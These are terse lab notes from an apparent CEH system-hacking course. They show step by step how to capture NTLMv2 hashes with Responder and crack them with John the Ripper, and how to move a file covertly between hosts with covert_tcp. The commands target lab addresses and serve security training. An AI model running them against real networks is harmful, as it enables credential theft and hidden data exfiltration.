# 6 - System Hacking

## Module 06 - System Hacking

### **Lab1 - Task1: Perform Active Online Attack to Crack the System's Password using Responder**

* **Linux:**
  * cd
  * cd Responder
  * chmox +x ./Responder.py
  * **sudo ./Responder.py -I eth0**
  * passwd: \*\*\*\*
* **Windows**
  * run
  * \CEH-Tools
* **Linux:**
  * Home/Responder/logs/SMB-NTMLv2-SSP-**\<Target IP>**txt
  * sudo snap install john-the-ripper
  * passwd: \*\*\*\*
  * **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**

### **Lab3-Task6: Covert Channels using Covert\_TCP**

* **Attacker:**
  * cd Desktop
  * mkdir Send
  * cd Send
  * echo "Secret"->message.txt
  * Place->Network
  * Ctrl+L
  * **smb://\<Target IP>**
  * Account & Password
  * copy and paste covert\_tcp.c
  * **cc -o covert\_tcp covert\_tcp.c**
* **Target:**
  * **tcpdump -nvvx port 8888 -I lo**
  * cd Desktop
  * mkdir Receive
  * cd Receive
  * File->Ctrl+L
  * smb://**\<Target IP>**
  * copy and paste covert\_tcp.c
  * cc -o covert\_tcp covert\_tcp.c
  * **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
  * **Tcpdump captures no packets**
* **Attacker**
  * **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
  * Wireshark (message string being send in individual packet)
